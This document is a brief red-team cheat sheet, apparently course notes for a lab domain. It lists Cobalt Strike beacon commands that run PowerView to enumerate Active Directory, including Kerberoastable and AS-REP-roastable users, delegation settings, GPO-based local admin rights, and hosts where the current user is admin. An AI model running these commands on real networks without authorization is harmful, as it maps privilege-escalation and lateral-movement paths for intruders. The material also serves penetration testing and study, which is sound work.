# Domain Recon (Powerview)

# Use PowerView for domain enumeration

    beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1

# Get Domain Information

    beacon> powerpick Get-Domain -Domain <>

# Get Domain SID

    beacon> powerpick Get-DomainSID

# Get Domain Controller

    beacon> powerpick Get-DomainController | select Forest, Name, OSVersion | fl

# Get Forest Information

    beacon> powerpick Get-ForestDomain -Forest <>

# Get Domain Policy 

    beacon> powerpick Get-DomainPolicyData | select -expand SystemAccess

# Get Domain users

    beacon> powerpick Get-DomainUser -Identity jking -Properties DisplayName, MemberOf | fl

# Identify Kerberoastable/ASEPRoastable User/Uncontrained Delegation

    beacon> powerpick Get-DomainUser | select cn,serviceprincipalname
    beacon> powerpick Get-DomainUser -PreauthNotRequired
    beacon> powerpick Get-DomainUser -TrustedToAuth

# Get Domain Computer

    beacon> powerpick Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName

# Identify Computer Accounts where unconstrained and constrained delefation is enabled

    beacon> powerpick Get-DomainComputer -Unconstrained | select cn, dnshostname
    beacon> powerpick Get-DomainComputer -TrustedToAuth | select cn, msdsallowedtodelegateto

# Get Domain OU

    beacon> powerpick Get-DomainOU -Properties Name | sort -Property Name

# Identify computers in given OU

    beacon> powerpick Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName

# Get Domain group (Use -Recurse Flag)

    beacon> powerpick Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName

# Get Domain Group Member

    beacon> powerpick Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
    beacon> powerpick Get-DomainGroupMember -Identity "Domain Admins" -Recurse | select MemberDistinguishedName

# Get Domain GPO

    beacon> powerpick Get-DomainGPO -Properties DisplayName | sort -Property DisplayName

# Find the System where given GPO are applicable

    beacon> powerpick Get-DomainOU -GPLink "{AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F}" | select distinguishedName

# Idenitfy domain users/group who have local admin via Restricted group or GPO 

    beacon> powerpick Get-DomainGPOLocalGroup | select GPODisplayName, GroupName

# Enumerates the machines where a specific domain user/group has local admin rights

    beacon> powerpick Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl

# Get Domain Trusts

    beacon> powerpick Get-DomainTrust

# Find Local Admin Access on other domain computers based on context of current user

    beacon> powerpick Find-LocalAdminAccess
    beacon> powerpick Invoke-CheckLocalAdminAccess -ComputerName <server_fqdn>

beacon> powerpick Invoke-UserHunter
beacon> powerpick Find-PSRemotingLocalAdminAccess -ComputerName <server_fqdn>
beacon> powerpick Find-WMILocalAdminAccess -ComputerName <server_fqdn>
